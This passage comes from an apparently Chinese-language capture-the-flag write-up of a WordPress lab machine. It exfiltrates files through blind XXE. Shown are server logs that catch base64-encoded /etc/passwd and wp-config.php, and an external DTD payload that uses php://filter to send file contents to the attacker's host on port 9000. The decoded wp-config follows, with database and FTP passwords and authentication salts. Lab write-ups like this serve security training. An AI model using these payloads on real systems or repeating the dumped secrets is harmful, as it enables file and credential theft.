+[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory
+[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Closing
+</code></pre>
+<p>这里传回来了一段 base64，去解密看一下</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# echo &#39;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo&#39;|base64 -d
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+base64: 无效的输入
+</code></pre>
+<p>确实成功弹回来了，那我们试试能不能获取到 wp-config.php</p>
+<pre><code class="bash">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=../wp-config.php&quot; &gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.14.84:9000/?p=%file;&#39;&gt;&quot;&gt;
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# php -S 0.0.0.0:9000
+[Sat Dec 31 13:55:53 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started
+[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Accepted
+[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 [200]: GET /evil.dtd
+[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Closing
+[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Accepted
+[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory
+[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Closing
+[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Accepted
+[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 [200]: GET /evil.dtd
+[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Closing
+[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 Accepted
+[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory
+[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 Closing
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# echo PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==|base64 -d
+&lt;?php
+/** The name of the database for WordPress */
+define( &#39;DB_NAME&#39;, &#39;blog&#39; );
+
+/** MySQL database username */
+define( &#39;DB_USER&#39;, &#39;blog&#39; );
+
+/** MySQL database password */
+define( &#39;DB_PASSWORD&#39;, &#39;635Aq@TdqrCwXFUZ&#39; );
+
+/** MySQL hostname */
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+
+/** Database Charset to use in creating database tables. */
+define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );
+
+/** The Database Collate type. Don&#39;t change this if in doubt. */
+define( &#39;DB_COLLATE&#39;, &#39;&#39; );
+
+define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; );
+define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );
+define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; );
+define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; );
+define( &#39;FTP_BASE&#39;, &#39;blog/&#39; );
+define( &#39;FTP_SSL&#39;, false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( &#39;AUTH_KEY&#39;,         &#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:&#39; );
+define( &#39;SECURE_AUTH_KEY&#39;,  &#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%&#39; );
+define( &#39;LOGGED_IN_KEY&#39;,    &#39;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy&#39; );
+define( &#39;NONCE_KEY&#39;,        &#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5&#39; );
+define( &#39;AUTH_SALT&#39;,        &#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D&#39; );
+define( &#39;SECURE_AUTH_SALT&#39;, &#39;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#39; );
+define( &#39;LOGGED_IN_SALT&#39;,   &#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#39; );
+define( &#39;NONCE_SALT&#39;,       &#39;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL&#39; );
+
+/**
+ * WordPress Database Table prefix.
+ */
